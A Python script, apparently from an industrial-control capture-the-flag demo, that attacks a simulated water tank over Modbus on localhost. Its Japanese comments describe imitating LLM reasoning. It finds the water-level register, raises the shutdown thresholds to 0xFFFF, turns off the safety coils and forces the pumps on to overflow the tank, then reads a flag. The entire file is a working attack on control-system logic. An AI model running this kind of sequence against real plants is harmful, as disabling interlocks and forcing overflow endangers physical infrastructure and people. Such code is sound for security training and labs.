#!/usr/bin/env python3
"""改良版: LLMの推論を模す。値の大きさから「しきい値 vs レート」を見分け、
排水を触らずに停止しきい値だけ潰し、安全を落とし、ポンプを強制ONにして溢水させる。
"""
import sys, time, re
sys.path.insert(0, "/Users/shunikeda/gitClones/ot-demo-3d/ctf/toolkit")
from mbclient import Modbus, regs_to_ascii

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5098
req = 0
def R():
    global req; req += 1

def main():
    t0 = time.time(); c = Modbus("127.0.0.1", PORT)
    # 発見: 水位レジスタ
    samples = []
    for _ in range(6):
        samples.append(c.read_holding(0, 60)); R(); time.sleep(0.15)
    level_reg, best = None, 1e9
    for a in range(60):
        s = [x[a] for x in samples]
        if max(s) > 1000 or min(s) < 0 or max(s) == min(s): continue
        d = [abs(s[i+1]-s[i]) for i in range(len(s)-1)]
        if sum(d)/len(d) < best and max(d) < 60: best, level_reg = sum(d)/len(d), a
    base = c.read_holding(0, 60); R()
    # 近傍の定数レジスタを「しきい値(>100) / レート(<=100)」に分類（LLM的推論）
    near = range(max(0, level_reg-2), level_reg+8)
    const = [a for a in near if a != level_reg and
             all(x[a]==base[a] for x in samples) and 0 < base[a] <= 65535]
    thresholds = [a for a in const if base[a] > 100]     # 停止SP/HH(800,950,...)
    rates = [a for a in const if base[a] <= 100]         # 給排水(15,8) → 触らない
    coils = c.read_coils(0, 16); R()
    on_coils = [i for i,b in enumerate(coils) if b]      # 安全=初期ON
    print(f"[発見] 水位={level_reg} しきい値={[(a,base[a]) for a in thresholds]} "
          f"レート={[(a,base[a]) for a in rates]} ONコイル={on_coils}")
    disc_req, disc_t = req, time.time()-t0

    # 攻撃: しきい値を到達不能に／安全コイルを落とす／残りコイル(ポンプ)をON
    for a in thresholds: c.write_register(a, 0xFFFF); R()
    for i in on_coils:   c.write_coil(i, False); R()
    for i in range(16):
        if i not in on_coils: c.write_coil(i, True); R()
    print("[攻撃] しきい値0xFFFF / 安全OFF / ポンプON（レートは温存）")

    win = ""
    while time.time()-t0 < 40:
        lvl = c.read_holding(level_reg,1)[0]; R()
        if lvl >= 1000:
            txt = regs_to_ascii(c.read_holding(100,100)); R()
            win = " ".join(re.findall(r"FLAG\{[^}]*\}", txt)); break
        time.sleep(0.2)
    print(f"[結果] 水位={c.read_holding(level_reg,1)[0]/10:.1f}% フラグ={win}")
    print(f"==== 合計{req}req/{time.time()-t0:.1f}s（発見{disc_req}req/{disc_t:.1f}s）====")
    c.close()

if __name__ == "__main__":
    main()
